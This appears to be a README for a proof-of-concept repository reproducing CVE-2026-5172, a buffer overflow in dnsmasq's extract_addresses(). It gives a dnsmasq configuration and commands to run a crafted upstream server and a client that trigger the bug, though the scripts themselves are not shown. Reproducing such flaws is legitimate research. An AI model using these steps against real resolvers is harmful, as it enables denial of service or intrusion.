# CVE20265172poc
CVE-2026-5172: buffer overflow in extract_addresses() on crafted resource record PoC

Topology read here
https://medium.com/@yanyuyingshu/reproduction-journal-dnsmasq-ecs-validation-and-buffer-overflow-flaws-e0fe0f66f60c

Steps​

1. vi /etc/dnsmasq.conf​

port=5353​

listen-address=xxx.xxx.xxx.x

bind-interfaces​

no-resolv​

no-hosts​

no-poll​

cache-size=1000​

log-queries​

log-facility=-​

server=127.0.0.1#5354​

(and restart dnsmasq daemon)​

​

2. python3 server.py --host 127.0.0.1 --port 5354 --rdlen 6 –debug &​

3. python3 client.py --dnsmasq-host xxx.xxx.xxx.x --dnsmasq-port 5353 --timeout 5.0 --count 3​
